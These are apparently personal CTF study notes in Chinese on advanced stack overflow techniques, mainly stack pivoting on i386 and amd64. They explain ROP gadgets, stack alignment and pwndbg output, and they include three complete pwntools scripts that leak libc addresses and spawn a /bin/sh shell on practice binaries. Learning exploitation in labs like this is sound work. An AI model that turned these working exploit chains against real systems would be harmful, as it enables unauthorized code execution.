DATE 2026-07-04

TITLE 栈溢出进阶技术

SUMMARY 包含对栈劫持、Canary保护机制及利用方式、__libc_csu_init的利用方式、ret2_dl_runtime_resolve的相关讲解

TAG 栈劫持, canary, libc_csu_init, ret2_dl_runtime_resolve

# 栈劫持
- **概念：** 将转移到固定可控的目标上的一种方法，比如转移到bss段或者转移到堆上
- 以下情况需要用到栈劫持：
#### 可以控制的栈溢出的字节数较少，难以构造较长的ROP链
#### 开启了ASLR保护，栈地址未知，可以将栈劫持到已知的区域
#### 难以利用其他漏洞，需要进行转换，比如栈劫持到堆空间

## 对应题目：
1. [[#栈劫持 Demo1（可控制栈溢出的字节数少）]]
2. [[#栈劫持Demo2：尝试不返回main函数（栈迁移）]]

## 栈劫持 Demo1（可控制栈溢出的字节数少）
- 程序结构：main→call_vunlfunc→return vunlfunc → return input_name → read \[溢出点]

> [!TIP]
> 在IDA中，如果一个变量没有找到定义点，通常为全局变量，可双击以确认并得到其静态确切位置（无保护时）

### 漏洞点分析：
- input_name 将 全局变量 magic 的12字节拷贝到栈上的 a1 指向的位置（v1数组，大小为8字节）
- 拷贝了a1\[0]    a1\[1]    a1\[2]   共 12 字节，v1只有8字节，溢出 4 字节
- 所以溢出的四个字节正好可以覆盖 vulnfunc 函数中的 ebp
- 参考：[[Pwn-栈结构-了解科普]]

### 程序分析：
![[Pasted image 20260203204200.png]]
- read函数负责将用户输入的 12字节 数据存到全局变量magic的地址处(magic、dword_804A384、dword_804A388这三个变量连续存储在.bss段或者.data段【经确认，存储在.bss段】)
- \*a1 = magic 这里的magic是全局变量的值，不是地址，将用户输入的第一个 4字节 复制给 a1 指向的内存，即v1\[0]
- 后面依次复制
- **dword是汇编/C语言中的常见缩写，意思是double word（双字）**

> [!CAUTION]
> 在32位程序中：
> 1 word = 2 bytes = 16 bits
> 1 dword = 2 words = 4bytes = 32bits
> dword_804A384就是一个存储在地址0x804A384的 4字节（32位）数据
> 在 IDA 反编译结果中，dword_前缀表示该符号是一个32位的数据变量


### payload分析：b"junk" + p32(backdoor) + p32(magic_addr)
```
vulnfunc栈帧：

低地址
v1[0]  (ebp-8)  <- a1指向这里
v1[1]  (ebp-4)
v1[2]  (ebp)     <- 覆盖的是这里（保存的ebp）
高地址
返回地址 (ebp+4)  <- 没有被覆盖
```
- **magic_addr** 由于存储在.bss段，是可写的全局变量地址，所以在函数返回后，该值会成为新ebp
- 函数vulnfunc执行到后面会有leave; ret指令，可利用这个指令（mov esp,ebp;pop ebp, pop rdi）。
- vulnfunc 返回时执行 leave，由于ebp指向v1\[2]，mov esp,ebp使得esp也指向 magic，接着，pop ebp使栈顶esp的值被弹入到ebp，然后这是栈结构："junk" -> p32(backdoor)（magic_addr（ebp）已经被弹出了）
- 接着ret（pop rdi），将p32(backdoor)弹出，接着执行backdoor，达到栈劫持


---
## 栈劫持Demo2：尝试不返回main函数（栈迁移）
- 原理：ret2libc（ASLR，地址空间布局随机化）+ 栈迁移（Stack Pivot），libc库的加载基址每次都不同

- **关键点解释：** pop ebp;ret 和 leave;ret 的作用：
- 先梳理payload1的逻辑：
- ```
  payload1 = 填充溢出 + 泄露gets_got + 写入新ROP链 + 设置ebp + 栈迁移
  ```
  - 泄露gets_got时的 pop ebp;ret：puts执行完后会ret，将执行pop ebp;ret，将gets_got（栈顶值）弹出，避免占用栈顶
  - 然后后续的gets_plt，在ret后执行，rop_addr是全局可控地址，为非栈区，用于将后续输入的payload2写入这个地址。
  - 设置栈迁移的锚点：设置ebp为rop_addr-4、接着 leave_ret执行栈迁移，这里减去 4 是因为leave;ret中的leave在执行栈迁移时，会mov esp,ebp，从而达到修改esp的目的，接着pop ebp，会弹出栈顶的值，从而让esp变为rop_addr，从而后续第二个payload得以执行。（第一个payload的gets_plt已经设置为读取的地址是从rop_addr读取，但是gets目前是暂停的，所以后续构造好payload2后发送给gets后，这段system("/bin/sh")是存储在rop_addr这个全局可控地址上的）

**需要注意的是：** 可控全局地址0x804a800属于程序的 .data段（无ASLR）
leave;ret通过修改ebp再执行leave，能直接将esp切换到任意可控地址

查看程序段的方法：readelf -S 程序名


exp：
```python
from pwn import *

context(arch='i386', os='linux')

p = process('./ret2libc3')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('./ret2libc3')

puts_plt = elf.plt['puts']
gets_plt = elf.plt['gets']
gets_got = elf.got['gets']

pop_ebp_ret = 0x080485db
leave_ret = 0x0804851e

rop_addr = 0x804a800

p.recvuntil(b'ret2libc3\n')
payload1 = b'a' * 0x108 + b'junk'

payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)
payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)
payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)
payload1 += p32(leave_ret)

p.sendline(payload1)

leak_addr = u32(p.recv(4))
libc_base = leak_addr - libc.symbols['gets']
libc.address = libc_base

system = libc.symbols['system']
binsh = next(libc.search('/bin/sh'))

payload2 = p32(system) + b'junk' + p32(binsh)

p.sendline(payload2)

p.interactive()
```

---
## 栈劫持Demo3：64位栈劫持：栈迁移
- 先学习一下amd64平台和i386的区别：
## amd64学习
![[Pasted image 20260207124325.png]]
![[Pasted image 20260207124337.png]]

---
![[Pasted image 20260207124354.png]]
![[Pasted image 20260207124408.png]]

---

## 接着来看看exp：
- 在exp中，rdi是第一个参数的寄存器。由于amd64中是寄存器传参的，而i386是栈传参的，所以要先指定参数位置
- 所以要调用puts打印got，应该先把gets_got弹到rdi，运用到pop rdi;ret
- 最后的pop_rsp3 + rop_addr - 0x18中：
- pop rsp; pop r13; pop r14; pop r15; ret
- 核心利用的是pop rsp，由于在AMD64程序中，**很难找到纯的pop rsp; ret**，大部分情况都会附带这些gadget，是副产物，不过没用
- 这里的目的是将栈指针 rsp 强行切换到 可控的 rop_addr（bss段地址），
- 而rop_addr - 0x18中的 0x18 是因为 r13 r14 r15需要额外消耗栈空间，为了让 rsp 正确落在 rop_addr 上，所以需要 8 x 3 = 24 = 0x18 来抵消（栈指针偏移）

**exp：**
```python
from pwn import *

context(arch='amd64', os='linux')

p = process('./ret2libc3_x64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./ret2libc3_x64')

puts_plt = elf.plt['puts']
gets_plt = elf.plt['gets']
gets_got = elf.got['gets']

rdi = 0x0000000000400783
pop_rsp3 = 0x000000000040077d

rop_addr = 0x601800

p.recvuntil(b'ret2libc3_x64\n')
payload1 = b'a' * 0x100 + b'junkjunk'

payload1 += p64(rdi) + p64(gets_got)
payload1 += p64(puts_plt)
payload1 += p64(rdi) + p64(rop_addr)
payload1 += p64(gets_plt)
payload1 += p64(pop_rsp3) + p64(rop_addr - 0x18)

p.sendline(payload1)

leak_addr = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = leak_addr - libc.symbols['gets']
libc.address = libc_base

system = libc.symbols['system']
binsh = next(libc.search('/bin/sh'))

payload2 = p64(rdi) + p64(binsh) + p64(system)

p.sendline(payload2)

p.interactive()
```


# 大总结：
## rop_addr 地址的确认方法：
- **总要求：在bss段内、未被占用、可读写、8字节对齐（AMD64）**
1. 用readefl获取bss段的 起始地址 + 大小 ，明确可用区间：`readelf -S ./ret2libc3_x64 | grep -i ".bss"`，
2. 输出类似：`[26] .bss              NOBITS           0000000000601060  00001048 0000000000000030  0000000000000000  WA       0     0     32`
3. 确认起始地址：0x601060，大小：0x30，权限：WA（可写+可分配），对齐：32
4. 用 objdump 排除 bss 段内已占用的地址（静态）：objdump -t ./ret2libc3_x64 | grep -i "bss"
5. 用gdb动态验证空闲地址（关键）：x/10xg 0x601078（这里的地址是序号4那里计算得到的空闲地址），若地址全为零->未被占用，否则换地址
6. 计算：根据pop的数量，计算需传入的地址：0x601060 + 0x18
## 当bss段的空间不足或被占用时，堆是更灵活的方案，可以info proc mappings查看
## 或者寻找其他rw-p权限的地址区间（第二行）
![[Pasted image 20260207182743.png]]

# 栈劫持Demo4：read不同于gets的特殊 栈迁移
- 这道题由于读取函数只有read，所以会限制读取的字数，由于限制为272，所以只能溢出16字节，也就是只能覆盖到返回地址，所以只能另辟蹊径

- 关于0x800，0x400，0x30数值的取值：**基于程序内存布局、缓冲区大小、栈对齐要求、ROP链空间需求计算得出**
- 基础前提：name_addr是程序中存储 name 输入的缓冲区起始地址，整理利用思路：先往 name 缓冲区写入ROP链、栈溢出覆盖rbp和返回地址、执行leave; ret完成栈迁移、泄露 read 的 GOT 地址、写入最终ROP链

## 0x30：栈对齐需求、ROP链前导填充、空间预留
- 栈对齐需求：AMD64的System V ABI 要求调用**函数前栈保持 16 字节对齐**，ret指令会让栈指针 rsp + 8，多个 ret 可调整栈到对齐状态
- ROP链前导填充：在真正的ROP链前填充无用的ret，避免ROP链起始位置与name缓冲区原有数据重叠
- 空间预留：0x30（384字节）能为后续ROP链（约64字节）预留足够的安全间距，确保ROP链完整且不被覆盖
- **确定依据：** 调试/反汇编验证：x/10xg 原则：填充数≥ROP链前需预留的空闲空间，且满足16字节对齐

## 0x800：远离原有数据、内存区域有效性、8字节对齐、空间充足
- 0x6018A0 % 8 = 0 满足AMD64地址对齐要求
- 且0x6010A0 + 0x800 = 0x6018A0 仍在 程序的 rw-p 可读写数据区（info proc mappings）
- 若x/10xg 0x6018A0输出全为0，则偏移合理
- **核心原则：** 偏移量需保证 rop_addr2 在 rw-p 区域内、空闲、对齐，且原理原有数据（通常选0x800 / 0x1000）

## 0x400：缓冲区大小匹配，完整写入内存，溢出前的基础填充
- name这里的输入最多可达到1024
- 确保ROP链完整写入name_addr对应的内存
- 这些数值并非固定值，而是可通过以下步骤推导的通用逻辑：

1. **确定缓冲区大小（如 0x400）**：
   
    - 反汇编找`read`/`fgets`等函数的第三个参数；
    - GDB 调试：`b read` → `run` → `p $rdx`（AMD64）/`p $edx`（i386），查看接收数据的长度。
    
2. **确定 ROP 链前导填充（如 0x30）**：
   
    - 计算 ROP 链总长度（如你的 ROP 链约 64 字节）；
    - 填充数需≥ROP 链长度，且满足 16 字节对齐（AMD64）/4 字节对齐（i386）。
    
3. **确定栈迁移偏移（如 0x800）**：
    - `info proc mappings`找`rw-p`区域的范围；
    - 选该区域内远离原有数据的地址（偏移量 = 目标地址 - 缓冲区起始地址）；
    - GDB 验证该地址是否空闲。

<font size=6 color=yellow>ret sled 的 0x10 次易致崩溃，因栈迁移后 rsp 位置不确定，足够多的 ret 能让 rsp 滑动跳过无效区域，精准落到 ROP 链，也有更精确的替代方案。</font>


---
---
```python
from pwn import *

context(arch='amd64', os='linux')

p = process('./rbp_leave')

elf = ELF('./rbp_leave')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

name_addr = 0x00000000006010A0

rdi = 0x00000000004007c3
rsi2 = 0x00000000004007c1
rsp = 0x000000004007bd
leave_ret = 0x00000000004006f0
ret = 0x0000000000400509
read_input = 0x00000000004006C7   #  Two params
rop_addr2 = name_addr + 0x800

name = p64(ret) *0x30
name += p64(rdi) + p64(elf.got['read'])
name += p64(elf.plt['puts'])
name += p64(rdi) + p64(rop_addr2)
name += p64(rsi2) + p64(0x200) + p64(0)
name += p64(read_input)
name += p64(rsp) + p64(rop_addr2 - 0x18)

p.sendafter(b'leave your name\n', name.ljust(0x400, b"\x00"))

payload1 = b"a" * 0x100
payload1 += p64(name_addr - 8)
payload1 += p64(leave_ret)
p.sendafter('try to break it\n', payload1)

leak_addr = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = leak_addr - libc.symbols['read']
libc.address = libc_base

system = libc.symbols['system']
binsh = next(libc.search('/bin/sh'))

payload2 = p64(rdi) + p64(binsh) + p64(system)

p.send(payload2)

p.interactive()
```



# 其他进阶技术：
## Canary保护机制及其利用方式
[[Canary保护机制及其利用方式]]

## __libc_csu_init的利用方式
[[libc_csu_init的利用方式]]

## ret2_dl_runtime_resolve
[[ret2_dl_runtime_resolve]]


# 补充：关于pwndbg的看法

> [!IMPORTANT]
> 关于pwndbg的看法：

## 这是寄存器界面

![[Pasted image 20260206154953.png]]

- **红色星号**：自上次单步执行（n/s/c等）后，值发生了变化的寄存器
- **白色寄存器**：如eax、ebx，是寄存器的名称，默认显示颜色
- **紫色的数值**（解引用后得到的内存地址）：寄存器当前的数值（通常是内存地址）
- **蓝色符号名**：该地址对应的符号（来自二进制文件的符号表）
- **绿色汇编指令**：该内存地址中存储的汇编指令，比如esi指向0x8048610（__libc_csu_init函数地址__），后面的push ebp是这个地址里的第一条指令
- **橙色的寄存器的当前值**（寄存器里直接存的数值）

- 箭头含义（解引用层级显示）（内存地址的解引用 dereference）
- 1，**向左箭头** ←：表示“寄存器的值是一个内存地址，这个地址里存储的内容是箭头右侧的值”
- 2，**向右箭头** →：通常用于栈指针（esp、ebp）的层级显示，表示“该栈指针指向的地址里存储的内容是箭头右侧的地址”，如果右侧地址还有内容，会继续用 ← 解引用显示


---
## 这是汇编界面与栈结构界面以及栈追踪界面

![[Pasted image 20260206165326.png]]

![[Pasted image 20260206170002.png]]
![[Pasted image 20260206170011.png]]
